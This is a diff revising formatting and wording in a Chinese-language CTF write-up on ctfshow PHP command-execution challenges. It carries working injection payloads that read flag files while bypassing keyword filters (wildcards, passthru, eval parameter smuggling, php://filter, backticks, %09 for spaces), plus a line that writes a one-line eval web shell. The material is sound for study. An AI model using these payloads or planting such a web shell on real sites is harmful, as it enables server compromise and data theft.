@@ -171,7 +171,7 @@ eval($c);
 
 **一些小知识：**
 
-> - **`*` 放在 flag 的开头、中间、结尾都可以，还能同时放多个**。这是 **Linux 服务器上 shell 通配符（globbing）**的行为，位置不限
+> - **`*` 放在 flag 的开头、中间、结尾都可以，还能同时放多个**。这是 **Linux 服务器上 shell 通配符（globbing）** 的行为，位置不限
 > - **`*` 不匹配以点 `.` 开头的隐藏文件**，也不会跨越路径分隔符 `/`。如果 flag 文件在别的目录，得写对路径，比如 `tac /tmp/f*`。
 
 ##### Q1：为什么大家都用 `tac` 不用 `cat`？
@@ -200,9 +200,9 @@ eval($c);
 
 ![image-20261105101528679](/assets/ctfshow-web-command-exec/image-20261105101528679.png)
 
-##### Q1：-E是·什么意思？
+##### Q1：-E是什么意思？
 
-> E 是 Extended（扩展的）的首字母，意思是 “让 grep 按**扩展正则表达式（Extended Regular Expressions，简称 ERE）**来解释模式”
+> E 是 Extended（扩展的）的首字母，意思是 “让 grep 按**扩展正则表达式（Extended Regular Expressions，简称 ERE）** 来解释模式”
 >
 > **加不加 -E 的区别：**
 >
@@ -400,7 +400,7 @@ AntSword.exe`）
 
 ![image-20261105185540035](/assets/ctfshow-web-command-exec/image-20261105185540035.png)
 
-base64前原来的木马
+base64 编码前的原始木马
 
 ```
 ?c=file_put_contents('shell.php','<?php eval($_POST[1]);?>');
@@ -484,13 +484,11 @@ cat flag.php
 
 ![image-20261105122908755](/assets/ctfshow-web-command-exec/image-20261105122908755.png)
 
-##### Q1：
+##### Q1：这里的反引号是什么意思，有什么用？
 
 ```
 ?c=echo `tac fla*`;
 ```
-
-里``是什么意思，有什么用？
 
 > 这两个符号叫**反引号**，在 shell 里它表示命令替换。这是 **Linux shell** 的语法，运行在远程靶机上。
 >
@@ -516,7 +514,7 @@ cat flag.php
 >
 > 3.echo 再把这段内容打印出来，你就看到了 flag
 
-##### Q2：?c=echo `tac fla*`;里加不加``有什么区别？
+##### Q2：加不加反引号有什么区别？
 
 > - `echo tac fla*`（没有反引号）：echo 只会把 `tac` 和文件名当**普通文字**打印出来，tac 根本不执行
 >
@@ -552,7 +550,7 @@ php代码的意思是传参c里不能出现flag，system，php。无论大小写
 | :------------- | :----------------------------------------------------------- | :------------------------------------- |
 | 通配符         | `?c=passthru("tac fla*");`                                   | `*` 匹配任意长度                       |
 | 单字符通配     | `?c=passthru("tac fla?????");`                               | `?` 匹配单个字符(fla+5个=8位=flag.php) |
-| **一石二鸟了** | `?c=passthru("tac f*");`                                     | `f*` 同时避开 flag 和 php 两个词       |
+| 通配符         | `?c=passthru("tac f*");`                                     | `f*` 同时避开 flag 和 php 两个词       |
 | 参数转移       | `?c=eval($_GET[1]);&1=system("tac flag.php");`               | c 里干净，命令执行放参数 1             |
 | 伪协议         | `?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php` | 输出 base64 再解码                     |
 | 拷走           | `?c=passthru("cp fla*.ph* 2.txt");` 再访问 `/2.txt`          | 用通配符绕 php                         |
@@ -570,7 +568,7 @@ PHP 里能执行系统命令的函数有一大把，system 只是最常用的那
 | `passthru()`   | `?c=passthru("tac fla*");`        | 直接输出(二进制也安全)                 |
 | `shell_exec()` | `?c=echo shell_exec("tac fla*");` | **返回**字符串，**必须 echo 才看得到** |
 | `exec()`       | `?c=echo exec("tac fla*");`       | 只返回**最后一行**，必须 echo          |
-| 反引号         | `?c=echo `tac fla*`;`             | 等价 `shell_exec`，最省事              |
+| 反引号         | ``?c=echo `tac fla*`;``           | 等价 `shell_exec`，最省事              |
 
 ##### 2.动态函数调用(可变函数)
 
@@ -682,7 +680,7 @@ flag，system，php，cat，sort，shell，.（点），空格，单引号 `'`
 | **通配符**                               | `fla*`、`f*`、`fla?????`                       | `f*` 同时绕 flag 和 php              |
 | **参数转移 / eval 嵌套**                 | `?c=eval($_GET[1]);&1=system("tac flag.php");` | **万能钥匙**，因为 preg_match 只查 c |
 | **passthru 换 system**                   | `?c=passthru("ls");`                           | web30说过了，继续用                  |
-| **反引号执行**                           | ?c=echo`tac%09fla*`;                           | shell 二字被挡但反引号本身没被挡     |
+| **反引号执行**                           | ``?c=echo`tac%09fla*`;``                       | shell 二字被挡但反引号本身没被挡     |
 | **show_source/highlight_file + scandir** | `show_source(scandir(getcwd())[2])`            | 思路一样，但 `.` 要换写法(见下)      |
 | **base64_decode**                        | `?c=passthru(base64_decode("..."));`           | base64 串本身安全，但包裹要用双引号  |
 
@@ -697,13 +695,16 @@ flag，system，php，cat，sort，shell，.（点），空格，单引号 `'`
 | `shell_exec()`                                | 含 **shell**        | 反引号 / passthru                         |
 | `system()`                                    | 含 **system**       | passthru / exec / 反引号                  |
 
-**本次新学的（一共 5 组）内容是：**
+**本次新学的（一共 8 组，对应下面 1~8 小节）内容是：**
 
 1. 空格替代：`%09`(Tab)、`${IFS}`
 2. 读文件命令替代：`tac`、`nl`、`tail`、`head`
-3. 点号替代：`getcwd()`、`pos(localeconv())`、`chr(46)`
-4. 字符串构造升级：十六进制转义 `"\x66\x6c..."`、`glob()`
-5. 进阶：取反 `~` 绕过
+3. shell 被挡：用反引号代替 `shell_exec()`
+4. 点号替代：`getcwd()`、`pos(localeconv())`、`chr(46)`
+5. 字符串构造：十六进制转义 `"\x66\x6c..."`
+6. `glob()` 直接找文件
+7. 取反 `~` 绕过
+8. 命令替换 `$(...)`
 
 #### 这三条比较常用，记这三条：
 
